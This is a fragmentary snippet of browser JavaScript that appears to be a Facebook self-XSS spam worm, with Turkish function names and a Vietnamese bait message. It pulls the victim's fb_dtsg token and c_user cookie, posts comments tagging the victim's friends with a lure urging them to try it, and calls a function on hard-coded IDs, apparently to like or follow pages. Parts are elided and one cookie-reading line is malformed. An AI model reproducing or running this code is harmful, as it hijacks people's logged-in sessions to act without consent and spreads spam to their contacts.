...
mesaj += " Mình làm được rồi nhé sao mọi người ko thử... Đẹp chưa nek  🌟  🍎  🐮  🐙  💑  🌻   <3 @[" + arkadaslar.payload.entries[i].uid +  ":" + arkadaslar.payload.entries[i].text + "]";
...
function yorum_yap(id ,mesaj) {
 ...
 xhr.open("POST", "/ajax/ufi/add_comment.php", true);
    ...
    xhr.send(params);
        ...
        arkadaslari_al(1436274393260393);
//
 var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function IDS(r) {
...
//Phuc
P("666563056739156");P("598442670242860");
//Hai Phong 2
P("454127744713150");P("426322507493674");P("425986434193948");P("454123761380215");